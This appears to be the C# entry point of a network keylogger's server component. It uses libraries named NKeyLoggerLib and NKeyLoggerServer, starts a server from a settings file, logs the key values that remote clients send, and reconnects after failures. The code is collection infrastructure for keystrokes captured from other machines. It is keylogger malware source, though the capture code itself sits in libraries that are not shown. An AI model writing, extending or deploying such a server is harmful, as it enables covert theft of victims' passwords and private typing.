using System.Linq.Expressions;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;
using NKeyLoggerServer;
class Program
{
    static string settingPath = "setting.txt";
    static int waitForReconnect = 500;
    public static void Main(string[] args)
    {
        try
        {
            AbstractSetting setting = new ConstSetting(settingPath, true);
            Server server = new Server(setting);
            var startTask = server.start();

            server.keyHandler += (Server serv, Network user, AbstractKeyInfo key) =>
            {
                Log<Program>.Instance.logger?.LogDebug(key.getValues().First() + " " + key.getValues().ElementAt(3));
            };

            server.updateTask += (Task t) =>
            {
                if (!t.IsCanceled)
                    startTask = t;
            };
        again:
            try
            {
                if (!startTask.IsCanceled)
                    startTask.Wait();
            }
            catch (AggregateException)
            {
                Thread.Sleep(waitForReconnect);
                if (!startTask.IsCanceled)
                    goto again;
            }
        }
        catch (Exception ex)
        {
            Log<Program>.Instance.logger?.LogError(ex.ToString());
        }
    }
}
